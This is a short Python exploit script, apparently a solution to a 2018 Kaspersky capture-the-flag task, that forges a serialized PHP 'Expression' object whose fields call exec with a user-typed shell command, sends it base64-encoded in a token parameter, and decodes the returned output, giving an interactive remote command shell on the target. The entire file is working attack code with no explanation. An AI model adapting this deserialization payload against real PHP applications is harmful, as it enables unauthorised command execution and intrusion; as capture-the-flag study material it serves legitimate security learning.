from base64 import b64encode, b64decode
import requests
import re

while True:
    url = 'http://expression.2018.ctf.kaspersky.com/?action=load&token='

    php_func = 'exec'
    func_param = input('Command: ')
    if func_param == "":
        func_param = 'ls -la'
    func_param = func_param + ' | base64'
    payload = 'O:10:"Expression":3:{s:14:"'.encode() + b'\x00' + 'Expression'.encode() + b'\x00' + 'op";s:'.encode() + str(len(php_func)).encode() + ':"'.encode() + php_func.encode() + '";s:18:"'.encode() + b'\x00' + 'Expression'.encode() + b'\x00' + 'params";s:'.encode() + str(len(func_param)).encode() + ':"'.encode() + func_param.encode() + '";s:9:"stringify";s:4:"TEST";}'.encode()

    token = b64encode(payload)

    final = url + token.decode()

    session = requests.Session()
    req = session.get(final)

    res = re.findall('<pre>(.*)</pre>',req.text, flags=re.DOTALL)
    print('='*20 + 'URL' + '='*20)
    print(final)
    print('='*20 + 'RESULT' + '='*20)
    print(b64decode(res[0][7:]).decode())
